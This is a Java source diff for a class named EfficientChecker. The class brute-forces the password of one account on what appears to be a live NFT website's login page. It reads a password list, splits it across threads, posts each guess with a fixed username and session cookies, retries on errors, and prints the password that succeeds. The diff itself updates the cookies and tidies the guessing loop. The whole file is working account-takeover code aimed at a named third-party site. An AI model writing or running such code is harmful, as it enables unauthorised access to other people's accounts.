@@ -25,16 +25,14 @@ import static org.millionaire.CommonUtils.mapToNameValuePairs;
 public class EfficientChecker {
 
     static String uri = "https://console-nft.art/starwars/index.php";
-    static Header header = new BasicHeader("cookie", "_fbp=fb.1.1642038134911.1484167444; PHPSESSID=b92b85f081cf5222b74b9835f95a5f64");
+    static Header header = new BasicHeader("cookie", "_fbp=fb.1.1642215672325.811608704; PHPSESSID=12476f37aff0edf8bbc4381950bbd579");
     static Header[] headers = new Header[]{header};
 
     static void efficientBrutal() {
         try {
-            String path = PasswordChecked.class.getClassLoader().getResource("passwords.txt").getPath();
+            String path = EfficientChecker.class.getClassLoader().getResource("passwords.txt").getPath();
             File file = new File(path);
             List<String> lines = FileUtils.readLines(file);
-            JSONObject jsonObject = new JSONObject();
-            jsonObject.put("name", "user_7414");
             AtomicInteger scope = new AtomicInteger(0);
             Runnable task = () -> {
                 int start = scope.getAndIncrement() * 300;
@@ -44,15 +42,15 @@ public class EfficientChecker {
                 System.out.println(Thread.currentThread().getName() + ": " + start + " ~ " + (start + 300));
                 CloseableHttpClient httpClient = HttpClients.createDefault();
                 int i = 1;
+                JSONObject jsonObject = new JSONObject();
+                jsonObject.put("name", "user_5968");
                 for (int i1 = 0; i1 < passwords.size(); i1++) {
-                    String password = passwords.get(i1);
-                    jsonObject.put("password", password);
-                    System.out.println(Thread.currentThread().getName() + ": [" + (i++) + "] " + password);
+                    jsonObject.put("password", passwords.get(i1));
                     String text = post(httpClient, jsonObject);
                     if (text.contains("error") || text.contains("issue"))
                         i1--;
                     else if (!text.contains("weak")) {
-                        System.out.println("correct: " + password);
+                        System.out.println("correct: " + passwords.get(i1));
                         System.out.println(text);
                         System.exit(1);
                     }
